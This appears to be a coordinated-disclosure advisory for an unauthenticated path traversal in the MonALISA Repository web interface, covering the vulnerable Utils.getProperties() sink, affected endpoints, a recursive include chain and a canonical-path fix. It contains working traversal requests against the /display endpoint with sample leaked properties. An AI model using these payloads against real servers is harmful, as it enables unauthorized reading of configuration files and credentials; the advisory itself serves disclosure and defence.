# Monalisa-path-traversal

Unauthenticated path traversal in the MonALISA Repository web interface, leading to arbitrary file read and recursive configuration exfiltration. 
Reported to CERN Computer Security Team on March 29 2026, patched March 30 2026. Published with CERNs knowledge under their coordinated vulnerability disclosure policy.


Affected software: https://github.com/MonALISA-CIT/Monalisa  


## The vulnerability

The root cause is in `src/lia/web/servlets/web/Utils.java` at line 313. The method `getProperties()` constructs a filesystem path by direct string concatenation of a base directory and a caller-supplied filename, then opens the result with `FileInputStream`.
No canonicalization is performed, no base-path confinement is enforced, and no traversal sequences are rejected.

```
String sFullFileName = sConfDir + sFile + ".properties";

try (FileInputStream fis = new FileInputStream(sFullFileName)) {
    pTemp.load(fis);
```

The value of `sFile` originates from the HTTP `page` parameter at every servlet that calls this method. There is no validation between the HTTP layer and the file open.

## Affected entry points

All of the following endpoints pass `gets("page")` directly to `getProperties()` with no prior validation. None have a `security-constraint` in `web.xml`.

| file | line | endpoint |
|---|---|---|
| display.java | 766 | /display |
| genimage.java | 50 | /genimage |
| stats.java | 131 | /stats |
| simple.java | 84 | /simple |
| FarmMap.java | 308 | /FarmMap |
| Panel.java | 61 | /panel |
| ThreadedPage.java | 1025 | (base class, all pages) |

## Why the existing checks do not help

Two traversal checks exist in the codebase. Neither protects the vulnerable path.

`show.java:63` contains `pageName.indexOf("..") >= 0`, which guards only the `show` servlet. It is a local fix at one entry point and has no effect on any other caller of `getProperties()`.

`display.java:689` checks the `image` parameter for `..`, not the `page` parameter. The `page` parameter reaches the file open at line 766 with no preceding validation. The presence of this check on a different parameter in the same file confirms that path traversal was understood as a concern.

The dangerous operation is in the shared sink `Utils.getProperties()`. A fix at an entry point does not protect any other entry point. The correct fix belongs at the sink.

## The include chain

`getProperties()` implements a recursive file inclusion mechanism. When a loaded file contains an `include` key, the named files are resolved through the same code path with the same absence of validation. A single request that loads a file containing `include=../../../../../../../../tmp/target` causes the server to open a second arbitrary file automatically. Both files are parsed and their contents merged into the HTTP response.

## Proof of concept

`PocServlet.java` in this repository contains a verbatim copy of `Utils.getProperties()` with no modification, deployed as a standard Java servlet on Tomcat 9. It prints the resolved filesystem path and all parsed properties for each request.

The following output was produced against a locally deployed instance.

Legitimate request:

```
GET /monalisa/display?page=global

resolved to: .../WEB-INF/conf/global.properties
properties read: 46
```

Path traversal to a file outside the web application root:

```
GET /monalisa/display?page=../../../../../../../../tmp/ml_db

resolved to: .../WEB-INF/conf/../../../../../../../../tmp/ml_db.properties
properties read: 51

db.password = s3cr3t_cern_0racle_p4ss
db.url      = jdbc:oracle:thin:@ora-cms-prod.cern.ch:1521:CMSMON
db.user     = monalisa_admin
secret.api.key = AKIA2X3Y4Z5CERNPROD
```

Chained include traversal, where `stage1.properties` contains `include=../../../../../../../../tmp/stage2`:

```
GET /monalisa/display?page=../../../../../../../../tmp/stage1

properties read: 49
chained.secret = CHAINED_TRAVERSAL_WORKS
exfil.data     = sensitive_data_from_hop2
stage          = 1
```

The server followed the `include` directive in the first file and loaded the second through the same unsanitized path. Both files are returned in a single response.

`PocServlet.java` PoC servlet containing the verbatim `getProperties()` logic from `Utils.java`. requires only `servlet-api.jar` to compile.

## Remediation

The fix must be applied inside `Utils.getProperties()` before the `FileInputStream` is opened, and again before any `include` value is resolved. The canonical path of the target file must be verified to begin with the canonical path of the base directory.

```
File base   = new File(sConfDir).getCanonicalFile();
File target = new File(sFullFileName).getCanonicalFile();
if (!target.toPath().startsWith(base.toPath())) {
    throw new IOException("path traversal rejected: " + sFullFileName);
}
```

CERN applied remediation to their deployed instances on March 30 2026.


## License

CC0
